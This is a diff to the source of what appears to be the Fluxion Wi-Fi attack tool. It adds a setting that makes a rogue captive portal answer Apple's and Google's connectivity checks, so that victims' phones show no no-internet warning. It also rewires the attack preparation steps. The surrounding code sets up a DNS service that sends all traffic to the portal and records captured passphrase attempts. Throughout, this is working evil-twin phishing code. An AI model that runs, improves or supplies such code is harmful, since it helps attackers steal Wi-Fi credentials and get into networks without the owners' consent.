@@ -242,6 +242,25 @@ function captive_portal_set_cert() {
 	fi
 }
 
+function captive_portal_unset_conn() {
+	CaptivePortalConnectivity=""
+}
+
+function captive_portal_set_conn() {
+	if [ "$CaptivePortalConnectivity" ]; then return 0; fi
+
+	captive_portal_unset_conn
+
+	local choices=("$CaptivePortalConnectivityDisconnectedOption" "$CaptivePortalConnectivityEmulatedOption" "$FLUXIONGeneralBackOption")
+	io_query_choice "$CaptivePortalConnectivityQuery" choices[@]
+
+	case "$IOQueryChoice" in
+		"$CaptivePortalConnectivityDisconnectedOption") CaptivePortalConnectivity="disconnected";;
+		"$CaptivePortalConnectivityEmulatedOption") CaptivePortalConnectivity="emulated";;
+		"$FLUXIONGeneralBackOption") captive_portal_unset_conn; return 1;;
+		*) fluxion_conditional_bail "Unknown connectivity option!"; return 2;;
+	esac
+}
 
 function captive_portal_unset_site() {
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal"
@@ -424,6 +443,11 @@ index-file.names = (
 	\"index.html\",
     \"index.php\"
 )
+
+# Redirect www.domain.com to domain.com
+#\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
+#	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+#}
 " > "$FLUXIONWorkspacePath/lighttpd.conf"
 
 	# Configure lighttpd's SSL only if we've got a certificate and its key.
@@ -436,19 +460,13 @@ index-file.names = (
 " >> "$FLUXIONWorkspacePath/lighttpd.conf"
 	fi
 
-	echo "\
-# Redirect www.domain.com to domain.com
-#\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
-#	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
-#}
-
+	if [ "$CaptivePortalConnectivity" = "emulated" ]; then
+		echo "\
 # The following will emulate Apple's and Google's internet connectivity checks.
 # This should help with no-internet-connection warnings in some devices.
-# NOTE: The following was disabled because iOS routes directly to the captive portal
-# when it detects there is one present, otherwise it takes forever to route to it.
-#\$HTTP[\"host\"] == \"captive.apple.com\" { # Respond with Apple's captive response.
-#	server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Apple/\"
-#}
+\$HTTP[\"host\"] == \"captive.apple.com\" { # Respond with Apple's captive response.
+	server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Apple/\"
+}
 
 # Consolidate the clusterfuck below, I'm sleepy right now, can't regex right...
 \$HTTP[\"host\"] == \"www.google.com\" { # Respond with Google's captive response.
@@ -476,7 +494,7 @@ index-file.names = (
 	url.rewrite-once = ( \"^/generate_204\$\" => \"generate_204.php\" )
 }
 " >> "$FLUXIONWorkspacePath/lighttpd.conf"
-
+	fi
 
 	# Create a DNS service with python, forwarding all traffic to gateway.
 	echo "\
@@ -545,7 +563,6 @@ trap handle_abort_authenticator SIGABRT
 
 echo > \"$FLUXIONWorkspacePath/candidate.txt\"
 echo -n \"0\"> \"$FLUXIONWorkspacePath/hit.txt\"
-echo > \"$FLUXIONWorkspacePath/wpa_supplicant.log\"
 
 # Make console cursor invisible, cnorm to revert.
 tput civis
@@ -930,6 +947,7 @@ function unprep_attack() {
 	CaptivePortalState="Not Ready"
 	captive_portal_unset_attack
 	captive_portal_unset_site
+	captive_portal_unset_conn
 	captive_portal_unset_cert
 	captive_portal_unset_auth
 	captive_portal_unset_interface
@@ -944,8 +962,11 @@ function prep_attack() {
 		captive_portal_set_cert; if [ $? -ne 0 ]; then
 			captive_portal_unset_auth; continue
 		fi
-		captive_portal_set_site; if [ $? -ne 0 ]; then
+		captive_portal_set_conn; if [ $? -ne 0 ]; then
 			captive_portal_unset_cert; continue
+		fi
+		captive_portal_set_site; if [ $? -ne 0 ]; then
+			captive_portal_unset_conn; continue
 		fi
 		captive_portal_set_attack; if [ $? -ne 0 ]; then
 			captive_portal_unset_site; continue
